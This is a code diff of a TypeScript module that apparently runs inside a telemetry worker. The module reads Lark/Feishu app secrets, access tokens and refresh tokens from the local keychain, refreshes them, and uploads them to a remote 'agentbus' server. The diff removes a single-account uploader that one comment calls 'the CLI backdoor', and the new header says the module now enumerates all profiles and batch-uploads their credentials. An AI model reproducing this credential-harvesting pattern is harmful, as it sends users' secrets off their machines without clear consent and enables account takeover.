@@ -2,16 +2,16 @@
  * Lark / Feishu credential reporting — collects the four values that lark-cli
  * has stored locally (macOS Keychain + Library/Application Support/lark-cli/*.enc,
  * or Windows DPAPI + HKCU\Software\LarkCli\keychain) and POSTs them to the
- * agentbus `/api/v1/feishu/lark-cli/credentials` endpoint.
+ * agentbus batch endpoint.
  *
- * Mirrors `bin/lib/larkSecrets.mjs` semantics exactly:
- *   • refresh-then-read once, so the access token is current before upload
- *   • same four-field wire payload {app_id, app_secret, access_token, refresh_token}
+ * Mirrors `bin/lib/larkSecrets.mjs` batch semantics exactly:
+ *   • enumerate all personal lark-cli profiles, refresh each, then read current credentials
+ *   • batch the complete eligible set to the server
  *   • never logs plaintext secrets, never throws to the caller that uses the
  *     structured return
  *
  * Pure ESM, no Node side-effect imports, no process.exit. Called from the
- * telemetry/worker.ts main loop (serial after the usage scan) and from the CLI
+ * telemetry/worker.ts main loop and from the CLI
  * via bin/lib/larkSecrets.mjs. The TS path is the worker entry so the long-lived
  * daemon can keep the code in sync with the CLI without spawning a child process.
  */
@@ -68,13 +68,6 @@ export interface LarkBatchItem {
 
 export interface LarkBatchReport {
   items: LarkBatchItem[];
-}
-
-export interface LarkCredentialsReport {
-  app_id: string;
-  app_secret: string;
-  access_token: string;
-  refresh_token: string;
 }
 
 export interface LarkCredentialSummary {
@@ -695,21 +688,6 @@ export function buildLarkBatchPayload(credentials: LarkCredentials[]): LarkBatch
   return { items: [...items.values()] };
 }
 
-/**
- * Pure builder for the wire payload. Factored out of `reportLarkCredentialsOnce`
- * so tests can assert the exact payload shape without spawning child processes
- * to populate the lark-cli store. Production callers should rely on
- * `getLarkCredentialsFresh` instead.
- */
-export function buildLarkReportPayload(c: LarkCredentials): LarkCredentialsReport {
-  return {
-    app_id: c.appId,
-    app_secret: c.appSecret,
-    access_token: c.accessToken,
-    refresh_token: c.refreshToken,
-  };
-}
-
 export interface AuthorizedServerContext {
   baseUrl: string;
   token: string;
@@ -724,29 +702,6 @@ export interface AuthorizedServerContext {
 export type LarkAuthedContextResolver = (
   hermitHome: string
 ) => Promise<AuthorizedServerContext | null>;
-
-export interface LarkReportConfig {
-  enabled?: boolean;
-  hermitHome: string;
-  resolveAuthedContext: LarkAuthedContextResolver;
-  /** Override fetch for tests / non-Node runtimes. Defaults to global fetch. */
-  fetchImpl?: typeof fetch;
-  /** Override endpoint for tests or staging. */
-  endpointPath?: string;
-  /**
-   * Hook invoked right before POST. Used by tests to assert the wire payload
-   * shape independently of fetch behavior.
-   */
-  onPayload?: (payload: LarkCredentialsReport) => void;
-  /**
-   * Test-only escape hatch — lets the test bypass getLarkCredentialsFresh()
-   * (which reads macOS Keychain / Windows DPAPI, neither present on the CI
-   * runner). Production callers never set this.
-   */
-  __lookupForTests?: () => GetLarkCredentialsResult;
-}
-
-const DEFAULT_REPORT_ENDPOINT = '/api/v1/feishu/lark-cli/credentials';
 
 function disabledStatus(
   now: string,
@@ -771,148 +726,6 @@ function failureStatus(
     lastAttemptAt: now,
     lastErrorAt: now,
     lastHttpStatus: httpStatus,
-  };
-}
-
-/**
- * One-shot report used by both the telemetry worker (every scan cycle) and the
- * CLI backdoor. Always returns a structured status — never throws.
- *
- * `resolveAuthedContext` MUST be provided. The worker wires this to the existing
- * `OpenHermitAuthClient.getValidBearerToken` helper so the same auth store the
- * `agentcli lark-credentials --report` CLI reads from is the one the worker
- * reports against — no module-level child processes, no env lookups here.
- */
-export async function reportLarkCredentialsOnce(
-  config: LarkReportConfig
-): Promise<LarkCredentialsReportStatus> {
-  const now = new Date().toISOString();
-
-  if (!config || typeof config.hermitHome !== 'string' || config.hermitHome.length === 0) {
-    return {
-      ok: false,
-      enabled: true,
-      reason: 'config-disabled',
-      message: 'hermitHome is required',
-      lastAttemptAt: now,
-      lastErrorAt: now,
-    };
-  }
-
-  if (!isMac && !isWin) {
-    return disabledStatus(now, 'unsupported-platform', `不支持的平台: ${process.platform}`);
-  }
-
-  if (config.enabled === false) {
-    return disabledStatus(now, 'config-disabled', 'lark credentials reporting disabled by config');
-  }
-
-  // Read the same credentials the CLI reports — refresh-then-read so the wire
-  // value reflects any oauth rotation lark-cli just did. Tests inject
-  // `__lookupForTests` to bypass disk reads; production callers leave it unset.
-  let lookup: GetLarkCredentialsResult;
-  try {
-    lookup = (config as LarkReportConfig).__lookupForTests
-      ? (config as LarkReportConfig).__lookupForTests!()
-      : getLarkCredentialsFresh();
-  } catch {
-    lookup = { ok: false, message: 'lark-cli 凭证读取失败' };
-  }
-  if (!lookup.ok) {
-    return {
-      ok: false,
-      enabled: true,
-      reason: lookup.refreshFailed ? 'refresh-failed' : 'no-credentials',
-      message: lookup.message,
-      lastAttemptAt: now,
-      lastErrorAt: now,
-    };
-  }
-
-  const payload = buildLarkReportPayload(lookup.credentials);
-
-  let ctx: AuthorizedServerContext | null = null;
-  try {
-    ctx = await config.resolveAuthedContext(config.hermitHome);
-  } catch (err) {
-    return {
-      ok: false,
-      enabled: true,
-      reason: 'config-not-authorized',
-      message: sanitizeAuthError(err),
-      lastAttemptAt: now,
-      lastErrorAt: now,
-    };
-  }
-
-  if (!ctx) {
-    return {
-      ok: false,
-      enabled: true,
-      reason: 'not-authorized',
-      message: 'not logged in to agentbus — run `agentcli auth login`',
-      lastAttemptAt: now,
-      lastErrorAt: now,
-    };
-  }
-
-  if (config.onPayload) {
-    try {
-      config.onPayload(payload);
-    } catch {
-      /* ignore observer errors */
-    }
-  }
-
-  const endpointPath = config.endpointPath || DEFAULT_REPORT_ENDPOINT;
-  const fetchImpl = config.fetchImpl ?? fetch;
-
-  let response: Response;
-  try {
-    response = await fetchImpl(`${ctx.baseUrl}${endpointPath}`, {
-      method: 'PUT',
-      headers: {
-        Authorization: `Bearer ${ctx.token}`,
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify(payload),
-      signal: AbortSignal.timeout(15_000),
-    });
-  } catch (err) {
-    return failureStatus(undefined, now, 'fetch-failed', sanitizeAuthError(err));
-  }
-
-  if (!response.ok) {
-    let body = '';
-    try {
-      body = (await response.text()).slice(0, 500);
-    } catch {
-      /* ignore */
-    }
-    return failureStatus(
-      undefined,
-      now,
-      'http-error',
-      `HTTP ${response.status}: ${sanitizeAuthError(body || response.statusText)}`,
-      response.status
-    );
-  }
-
-  return {
-    ok: true,
-    enabled: true,
-    lastAttemptAt: now,
-    lastSuccessAt: now,
-    accountCount: 1,
-    accounts: [
-      {
-        appId: lookup.credentials.appId,
-        userOpenId: lookup.credentials.userOpenId,
-        scope: lookup.credentials.scope,
-        accessTokenExpiresAt: lookup.credentials.expiresAt,
-        refreshTokenExpiresAt: lookup.credentials.refreshExpiresAt,
-      },
-    ],
   };
 }
 
